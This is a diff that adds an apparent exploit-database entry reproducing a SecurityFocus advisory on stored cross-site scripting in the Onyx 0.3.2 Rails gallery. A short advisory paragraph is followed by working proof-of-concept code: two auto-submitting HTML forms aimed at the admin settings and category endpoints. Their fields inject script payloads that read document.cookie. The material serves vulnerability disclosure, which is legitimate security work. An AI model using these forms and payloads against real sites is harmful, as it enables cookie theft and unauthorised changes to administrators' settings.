@@ -1,0 +1,47 @@
+source: http://www.securityfocus.com/bid/42446/info
+
+Onyx is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Onyx 0.3.2 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/admin/settings/update" method="post" name="main" >
+
+<input type="hidden" name="setting[site_title]" value="My Onyx Gallery" />
+<input type="hidden" name="setting[site_keywords]" value='Ruby on Rails Gallery"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="setting[site_description]" value='Onyx is an open source free ruby on rails gallery"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="setting[welcome_title]" value="Welcome!" />
+<input type="hidden" name="setting[welcome_message]" value="Welcome to my gallery!" />
+<input type="hidden" name="setting[uniform_width]" value="500" />
+<input type="hidden" name="setting[uniform_height]" value="500" />
+<input type="hidden" name="setting[thumbnail_width]" value="100" />
+<input type="hidden" name="setting[thumbnail_height]" value="100" />
+<input type="hidden" name="setting[dummy_watermark_enabled]" value="0" />
+<input type="hidden" name="setting[tooltips_enabled]" value="1" />
+<input type="hidden" name="setting[tooltip_width]" value="300" />
+<input type="hidden" name="setting[maximum_uploadable_files]" value="10" />
+<input type="hidden" name="commit" value="Update Settings" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+<form action="http://www.example.com/admin/categories/update/1" method="post" name="main" >
+
+<input type="hidden" name="category[name]" value="General" />
+<input type="hidden" name="category[description]" value='My Pictures"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="category[created_at(1i)]" value="2010" />
+<input type="hidden" name="category[created_at(2i)]" value="7" />
+<input type="hidden" name="category[created_at(3i)]" value="23" />
+<input type="hidden" name="category[created_at(4i)]" value="04" />
+<input type="hidden" name="category[created_at(5i)]" value="00" />
+<input type="hidden" name="commit" value="Edit" />
+
+</form>
+<script>
+document.main.submit();
+</script>
